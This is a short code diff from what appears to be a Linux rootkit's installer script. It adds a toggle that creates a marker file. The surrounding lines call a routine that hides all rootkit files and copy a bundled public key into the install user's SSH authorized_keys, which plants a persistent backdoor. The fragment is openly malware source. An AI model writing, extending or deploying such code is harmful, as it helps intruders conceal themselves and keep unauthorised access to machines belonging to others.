@@ -80,11 +80,12 @@ setup_home(){ # $1 = home/install directory
         echo -n "$MAGIC_GID" > $GID_PATH;
     }
 
+    [ "`toggle_enabled HIDE_MY_ASS`" == 'true' ] && touch $homedir/my_ass
+
     [ "`toggle_enabled HIDE_SELF`" == "true" ] && {
         necho "Hiding all rootkit files" &&
         hide_rootkitfiles $homedir;
     }
-
 
     [ -f './etc/id_rsa.pub' ] && {
         necho "Copying ./etc/id_rsa.pub to $homedir/.ssh/authorized_keys" &&
